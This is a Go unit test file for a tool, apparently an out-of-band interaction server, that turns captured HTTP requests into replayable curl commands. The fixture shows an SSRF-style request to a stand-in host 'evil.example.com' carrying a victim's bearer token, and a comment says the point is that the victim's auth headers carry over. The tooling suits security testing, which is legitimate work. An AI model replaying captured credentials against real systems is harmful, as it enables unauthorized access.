package httpx

import (
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/defektive/xodbox/pkg/types"
)

// Event must satisfy the optional CurlProvider interface.
var _ types.CurlProvider = (*Event)(nil)

func TestCurlCommand(t *testing.T) {
	body := `{"user":"o'brien"}` // embedded single quote exercises escaping
	r := httptest.NewRequest("POST", "http://evil.example.com/x/ssrf?id=1", strings.NewReader(body))
	r.Header.Set("Authorization", "Bearer sekret")
	r.Header.Set("Content-Type", "application/json")
	r.Header.Set("Content-Length", "999") // curl derives this; must be skipped

	e := &Event{BaseEvent: &types.BaseEvent{}, req: r, body: []byte(body)}
	got := e.CurlCommand()

	if !strings.Contains(got, "curl -X POST 'http://evil.example.com/x/ssrf?id=1'") {
		t.Errorf("missing method/url:\n%s", got)
	}
	// The victim's headers (e.g. auth) carry over — the whole point for SSRF.
	if !strings.Contains(got, "-H 'Authorization: Bearer sekret'") {
		t.Errorf("missing Authorization header:\n%s", got)
	}
	if strings.Contains(got, "Content-Length") {
		t.Errorf("Content-Length should be skipped:\n%s", got)
	}
	if !strings.Contains(got, `--data-raw '{"user":"o'\''brien"}'`) {
		t.Errorf("body not shell-escaped correctly:\n%s", got)
	}
}

func TestCurlCommandGETNoBody(t *testing.T) {
	r := httptest.NewRequest("GET", "http://h/x", nil)
	e := &Event{BaseEvent: &types.BaseEvent{}, req: r}
	got := e.CurlCommand()

	if strings.Contains(got, "-X GET") {
		t.Errorf("GET without body should omit -X:\n%s", got)
	}
	if strings.Contains(got, "--data-raw") {
		t.Errorf("no body should omit --data-raw:\n%s", got)
	}
	if !strings.HasPrefix(got, "curl 'http://h/x'") {
		t.Errorf("unexpected GET command:\n%s", got)
	}
}
